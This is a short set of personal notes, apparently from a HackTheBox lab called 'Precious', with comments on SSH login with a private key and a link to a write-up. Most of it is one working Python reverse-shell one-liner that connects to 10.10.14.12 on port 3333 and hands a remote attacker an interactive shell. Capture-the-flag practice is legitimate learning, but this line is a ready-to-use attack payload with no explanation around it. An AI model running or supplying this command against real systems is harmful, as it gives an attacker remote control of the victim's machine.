# hack using ssh
# ssh -i id_rsa <user>@<ip>
# https://systemweakness.com/hackthebox-writeup-precious-24c16e75a73a

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
